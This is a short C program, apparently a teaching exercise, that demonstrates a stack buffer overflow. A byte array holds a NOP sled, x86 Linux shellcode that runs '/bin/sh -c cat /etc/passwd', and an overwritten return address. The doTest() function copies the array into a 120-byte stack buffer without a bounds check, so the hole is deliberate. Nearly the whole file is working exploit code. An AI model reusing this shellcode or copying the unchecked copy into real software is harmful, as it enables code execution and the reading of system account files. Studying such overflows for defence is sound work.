#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
void doTest();
int main(int argc, char * argv[]){
    doTest();
    exit(0);
}
char compromise[145] = {
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0x90,	
	0xEB,	
	0x29,	
	0x5E,	
	0x31,	
	0xC0,	
	0x88,	
	0x46,	
	0x07,	
	0x88,	
	0x46,	
	0x0B,	
	0x88,	
	0x46,	
	0x20,	
	0x89,	
	0x46,	
	0x2D,	
	0x89,	
	0x76,	
	0x21,	
	0x8D,	
	0x7E,	
	0x09,	
	0x89,	
	0x7E,	
	0x25,	
	0x8D,	
	0x7E,	
	0x0C,	
	0x89,	
	0x7E,	
	0x29,	
	0xB0,	
	0x0B,	
	0x89,	
	0xF3,	
	0x8D,	
	0x4E,	
	0x21,	
	0x31,	
	0xD2,	
	0xCD,	
	0x80,	
	0xE8,	
	0xD2,	
	0xFF,	
	0xFF,	
	0xFF,	
	0x2F,	
	0x62,	
	0x69,	
	0x6E,	
	0x2F,	
	0x73,	
	0x68,	
	0x58,	
	0x79,	
	0x2D,	
	0x63,	
	0x58,	
	0x63,	
	0x61,	
	0x74,	
	0x20,	
	0x2F,	
	0x65,	
	0x74,	
	0x63,	
	0x2F,	
	0x70,	
	0x61,	
	0x73,	
	0x73,	
	0x77,	
	0x64,	
	0x3B,	
	0x65,	
	0x78,	
	0x69,	
	0x74,	
	0x58,	
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,
	0xFF,	
	0xFF,	
	0xFF,	
	0xFF,	
	0x3B,
	0xf8,
	0xff,
	0xbf,
	0x00
};
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
	"WXYZ";
int i;
void doTest(){
    char buffer[120];
    for (i = 0; compromise[i]; i++) {
		buffer[i] = compromise[i];
	}
}
